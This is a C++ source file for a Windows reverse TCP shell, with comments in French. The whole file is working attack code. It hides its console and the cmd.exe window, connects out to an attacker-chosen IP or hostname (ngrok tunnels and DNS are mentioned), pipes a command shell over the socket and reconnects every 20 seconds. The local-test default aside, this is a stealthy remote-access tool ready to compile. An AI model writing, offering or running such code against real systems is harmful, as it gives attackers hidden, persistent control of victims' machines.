// language: C++17, file: src/tools/02_reverse_shell.cpp, target: Windows 10/11, MSVC/MinGW
// Reverse TCP - cmd.exe via pipes, reconnexion auto toutes les 20 s
// Usage: reverse_shell.exe <ip> <port>   (defaut 127.0.0.1 4444 pour test local)
// MinGW: g++ -O2 -std=c++17 02_reverse_shell.cpp -o shell.exe -lws2_32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <cstdio>
#include <string>

#pragma comment(lib, "ws2_32.lib")

static void RunShell(SOCKET s) {
    SECURITY_ATTRIBUTES sa{ sizeof(sa), NULL, TRUE };
    HANDLE inR = NULL, inW = NULL, outR = NULL, outW = NULL;
    // pipes duplex: socket -> stdin, stdout -> socket
    CreatePipe(&inR, &inW, &sa, 0);
    CreatePipe(&outR, &outW, &sa, 0);
    SetHandleInformation(inW, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(outR, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{}; si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = inR; si.hStdOutput = outW; si.hStdError = outW;
    PROCESS_INFORMATION pi{};
    if (!CreateProcessA(NULL, (LPSTR)"cmd.exe /q", NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        closesocket(s); return;
    }
    CloseHandle(inR); CloseHandle(outW);

    u_long nb = 1;
    ioctlsocket(s, FIONBIO, &nb);
    char buf[8192];
    for (;;) {
        // pipe -> socket
        DWORD avail = 0;
        while (PeekNamedPipe(outR, NULL, 0, NULL, &avail, NULL) && avail > 0) {
            DWORD rd = 0;
            if (!ReadFile(outR, buf, sizeof(buf), &rd, NULL) || rd == 0) goto dead;
            send(s, buf, rd, 0);
        }
        // socket -> pipe
        int r = recv(s, buf, sizeof(buf), 0);
        if (r > 0) {
            DWORD wr = 0;
            WriteFile(inW, buf, (DWORD)r, &wr, NULL);
        } else if (r == 0 || (r < 0 && WSAGetLastError() != WSAEWOULDBLOCK)) {
            goto dead;
        }
        if (WaitForSingleObject(pi.hProcess, 40) == WAIT_OBJECT_0) break;
    }
dead:
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    CloseHandle(inW); CloseHandle(outR);
    closesocket(s);
}

int main(int argc, char** argv) {
    FreeConsole();
    const char* ip = argc > 1 ? argv[1] : "127.0.0.1";
    u_short port = (u_short)(argc > 2 ? atoi(argv[2]) : 4444);

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    // reconnexion toutes les 20 s - accepte IP ou nom d'host (tunnel ngrok, DNS)
    for (;;) {
        addrinfo hints{}; hints.ai_family = AF_UNSPEC; hints.ai_socktype = SOCK_STREAM;
        addrinfo* res = nullptr;
        if (getaddrinfo(ip, std::to_string(port).c_str(), &hints, &res) != 0 || !res) {
            Sleep(20000); continue;
        }
        SOCKET s = socket(res->ai_family, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) { freeaddrinfo(res); Sleep(20000); continue; }
        if (connect(s, res->ai_addr, (int)res->ai_addrlen) == 0) {
            RunShell(s);
        } else {
            closesocket(s);
        }
        freeaddrinfo(res);
        // reconnexion automatique - le handler doit juste rester up
        Sleep(20000);
    }
    WSACleanup();
    return 0;
}
